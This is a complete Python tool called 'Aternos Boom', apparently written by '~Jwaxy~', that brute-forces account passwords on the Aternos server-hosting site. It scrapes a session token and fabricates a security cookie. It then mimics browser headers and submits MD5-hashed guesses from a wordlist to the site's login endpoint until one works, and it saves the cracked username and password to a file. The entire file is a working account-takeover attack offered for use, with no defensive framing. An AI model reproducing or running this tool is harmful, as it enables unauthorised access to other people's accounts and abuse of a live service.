# By ~Jwaxy~

import requests
import argparse
from tqdm import tqdm
from sys import exit, argv
import random, string
import re

print("""\033[0;36m

 ██████\    ██\                                                       ███████\                                    
██  __██\   ██ |                                                      ██  __██\                                   
██ /  ██ |██████\    ██████\   ██████\  ███████\   ██████\   ███████\ ██ |  ██ | ██████\   ██████\  ██████\████\  
████████ |\_██  _|  ██  __██\ ██  __██\ ██  __██\ ██  __██\ ██  _____|███████\ |██  __██\ ██  __██\ ██  _██  _██\ 
██  __██ |  ██ |    ████████ |██ |  \__|██ |  ██ |██ /  ██ |\██████\  ██  __██\ ██ /  ██ |██ /  ██ |██ / ██ / ██ |
██ |  ██ |  ██ |██\ ██   ____|██ |      ██ |  ██ |██ |  ██ | \____██\ ██ |  ██ |██ |  ██ |██ |  ██ |██ | ██ | ██ |
██ |  ██ |  \████  |\███████\ ██ |      ██ |  ██ |\██████  |███████  |███████  |\██████  |\██████  |██ | ██ | ██ |
\__|  \__|   \____/  \_______|\__|      \__|  \__| \______/ \_______/ \_______/  \______/  \______/ \__| \__| \__|
\033[0m   
                                                                                        \033[1;35mBy ~Jwaxy~

""")
print("\033[3m")

parser = argparse.ArgumentParser(
                    prog = 'aternosboom.py',
                    description = 'Aternos Boom! 💣️💥️  Cracks aternos passwords')

parser.add_argument('-w', '--wordlist', required=True, help='The path of the md5 wordlist', nargs=1)
parser.add_argument('-u', '--user', required=True,help='The username of the user.', nargs=1)
parser.add_argument('-o', '--out', required=False,help='Filename of the file that the username and password will be saved when found.', nargs=1)
parser.add_argument('-v', '--verbose', required=False,help='Verbose (detailed) mode', action="count", default=0)

if len(argv)==1:
    parser.print_help()
    exit(1)

args = parser.parse_args()

wordlist_path = args.wordlist[0]
username = args.user[0]
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
out_path = args.out[0] if args.out else None
debug = True if args.verbose == 1 else False

def gen_sec():
    rnd_str1 = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
    rnd_str2 = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(11))
    key = rnd_str1+"000000"
    value = rnd_str2 + "00000"
    return f"{key}:{value}"

def get_token():
    regex = r"\/\*window\[\"AJAX_TOKEN\"\]=\"[a-zA-Z0-9_]*\"}\*/"

    cookies = {
        'ATERNOS_LANGUAGE': 'en'
    }

    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://aternos.org/:en/',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
    }


    matchh = ":("

    counter = 1

    print("Getting the token from aternos...")

    while matchh == ":(":
        print(f"trying for the {counter}th time...")
        resp = requests.get('https://aternos.org/go/', cookies=cookies, headers=headers)
        matches = re.finditer(regex, resp.text)
        for matchNum, match in enumerate(matches, start=1):
            matchh = match.group()
        if matchh != ":(":
            matchh = matchh.split('"')[3]
            print("found the token! :)")
            return matchh
        else:
            print("didn't find it :(")
            counter += 1


sec = gen_sec()
token = get_token()

if debug:
    print("token: " + token)
    print("secret: " + sec)
    print("secret cookie: " + f'ATERNOS_SEC_{sec.split(":")[0]} : {sec.split(":")[1]}')

def login(user, md5_password, sec, token):
    """ Logins to aternos using given creditinals and returns the response. """


    cookies = {
        f'ATERNOS_SEC_{sec.split(":")[0]}' : sec.split(":")[1],
        'ATERNOS_LANGUAGE' : 'en'
    }

    headers = {
        'User-Agent': user_agent,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://aternos.org',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://aternos.org/go/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }

    params = {
        'SEC': sec,
        'TOKEN': token,
    }

    data = {
        'user': user,
        'password': md5_password,
    }

    response = requests.post(
        'https://aternos.org/panel/ajax/account/login.php',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data
    )
    if debug:
        print("RESPONSE:", response.text)
    return response.json()

src = open(wordlist_path)

#TODO: ctrl-c ye basıldiginda program listede kaldigi yeri kaydedecek ve tekrar calistirildiginda dosya var mi diye bakacak ve eger varsa oradan devam edecek
print("\nStarting the brute-force :D\n")

for line in tqdm(src.readlines(), desc="\033[36;1mTrying...", colour='MAGENTA', ascii="░█"):
    line = line.replace("\n", "").replace("\r", "")
    line = line.split()
    passw = line[1]
    passw_md5 = line[0]
    resp = login(user=username, md5_password=passw_md5, sec=sec, token=token)
    if debug:
        print(f"User: {username} | Pass: {passw} | MD5Pass: {passw_md5}")
    if resp["success"] == True:
        print("Found it! 🎉️")
        print(f"User: {username} | Pass: {passw}")
        if out_path != None:
            with open(out_path, "w") as filee:
                filee.write(f"# By AternosBoom\nUser: {username} | Pass: {passw}")
        exit(1)
    else:
        pass

print("Sorry! :( Can't find the password try using another wordlist.")
